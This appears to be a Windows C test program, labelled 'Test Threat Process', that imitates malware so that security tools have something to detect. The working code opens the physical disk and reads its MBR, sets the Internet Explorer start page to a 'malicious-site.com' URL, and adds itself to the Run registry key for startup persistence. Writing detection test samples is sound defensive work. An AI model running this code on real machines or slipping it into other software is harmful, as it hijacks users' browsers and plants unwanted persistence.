#include <windows.h>
#include <stdio.h>

void ModifyIEStartPage() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Internet Explorer\\Main", 
        0, KEY_WRITE, &hKey);
    
    if (result == ERROR_SUCCESS) {
        wchar_t maliciousUrl[] = L"http://malicious-site.com";
        RegSetValueExW(hKey, L"Start Page", 0, REG_SZ, 
            (BYTE*)maliciousUrl, sizeof(maliciousUrl));
        RegCloseKey(hKey);
    }
}

void AddToStartup() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey);
    
    if (result == ERROR_SUCCESS) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        RegSetValueExW(hKey, L"MaliciousStartup", 0, REG_SZ, 
            (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

int main() {
    printf("Test Threat Process - Attempting malicious actions...\n");
    
    printf("[1] Opening PhysicalDrive0 (MBR attack)...\n");
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        printf("    SUCCESS: PhysicalDrive0 opened!\n");
        BYTE mbr[512] = {0};
        DWORD bytesRead;
        if (ReadFile(hDisk, mbr, 512, &bytesRead, NULL)) {
            printf("    SUCCESS: Read %lu bytes from MBR\n", bytesRead);
        }
        // Don't close the handle - keep it open for scanning
    } else {
        printf("    FAILED: Cannot open PhysicalDrive0 (error: %lu)\n", GetLastError());
    }
    
    printf("[2] Modifying IE start page (browser hijack)...\n");
    ModifyIEStartPage();
    
    printf("[3] Adding to startup...\n");
    AddToStartup();
    
    printf("\nWaiting for detection (30 seconds)...\n");
    for (int i = 0; i < 30; i++) {
        printf("  Waiting %d/30...\r", i+1);
        fflush(stdout);
        Sleep(1000);
    }
    printf("\n");
    printf("Press Enter to exit...\n");
    getchar();
    
    if (hDisk != INVALID_HANDLE_VALUE) {
        CloseHandle(hDisk);
    }
    
    return 0;
}